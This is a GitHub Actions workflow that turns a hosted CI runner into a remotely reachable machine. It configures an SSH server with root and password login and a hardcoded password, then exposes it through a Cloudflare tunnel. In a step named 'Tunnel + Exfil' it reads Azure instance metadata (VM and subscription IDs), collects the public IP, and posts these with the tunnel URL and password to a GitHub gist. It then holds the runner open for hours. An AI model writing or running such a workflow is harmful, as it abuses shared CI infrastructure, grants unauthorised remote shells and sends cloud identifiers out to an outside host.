name: Tunnel v8 Gist

on:
  workflow_dispatch:
    inputs:
      gist_id:
        description: 'Gist ID for output'
        required: true
        default: 'c1790bcc9487c635151fb1594b976d54'

permissions:
  contents: read

jobs:
  tunnel:
    runs-on: ubuntu-latest
    timeout-minutes: 355
    steps:
      - name: Install
        run: |
          sudo apt-get install -y openssh-server -q 2>/dev/null | tail -1
          curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared --max-time 60
          sudo chmod +x /usr/local/bin/cloudflared
          cloudflared --version && echo CLOUDFLARED_OK

      - name: SSH Server
        run: |
          sudo mkdir -p /etc/ssh /run/sshd && sudo ssh-keygen -A -q 2>/dev/null
          printf 'Port 22\nPermitRootLogin yes\nPubkeyAuthentication yes\nAuthorizedKeysFile %%h/.ssh/authorized_keys\nPasswordAuthentication yes\nGatewayPorts yes\nAllowTcpForwarding yes\nSubsystem sftp /usr/lib/openssh/sftp-server\n' | sudo tee /etc/ssh/sshd_config >/dev/null
          sudo mkdir -p /root/.ssh /home/runner/.ssh
          echo 'ssh-rsa  sysadmin@sysadmin' | sudo tee /root/.ssh/authorized_keys /home/runner/.ssh/authorized_keys
          sudo chmod 700 /root/.ssh /home/runner/.ssh && sudo chmod 600 /root/.ssh/authorized_keys /home/runner/.ssh/authorized_keys
          echo 'runner:Pwn2Own2026!' | sudo chpasswd
          echo 'root:Pwn2Own2026!' | sudo chpasswd
          sudo /usr/sbin/sshd && echo SSH_UP

      - name: Tunnel + Exfil
        env:
          GIST_ID: ${{ inputs.gist_id }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          INST=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
          VMID=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])" 2>/dev/null || echo unknown)
          SUB=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])" 2>/dev/null || echo unknown)
          LOC=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['location'])" 2>/dev/null || echo unknown)
          PUBLIC=$(curl -sf https://api.ipify.org 2>/dev/null || echo unknown)
          cloudflared tunnel --url tcp://localhost:22 --no-autoupdate > /tmp/cf_ssh.log 2>&1 &
          sleep 30
          CF_SSH=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_ssh.log | head -1)
          echo "::notice title=CF_SSH_URL::$CF_SSH"
          echo "::notice title=VMID::$VMID"
          echo "::notice title=SUB::$SUB"
          echo CF_SSH_URL=$CF_SSH
          echo VMID=$VMID
          echo SUB=$SUB
          CONTENT="CF_SSH_URL=${CF_SSH}\nVMID=${VMID}\nSUB=${SUB}\nLOC=${LOC}\nPUBLIC=${PUBLIC}\nPASSWORD=Pwn2Own2026!"
          curl -s -X PATCH "https://api.github.com/gists/${GIST_ID}" \
            -H "Authorization: token ${GH_TOKEN}" \
            -H "Content-Type: application/json" \
            -d "{\"files\":{\"tunnel_output.txt\":{\"content\":\"${CONTENT}\"}}}" -o /dev/null
          echo "Gist updated with CF URL"
          for i in $(seq 1 350); do sleep 60; echo beat=$i CF=$CF_SSH; done
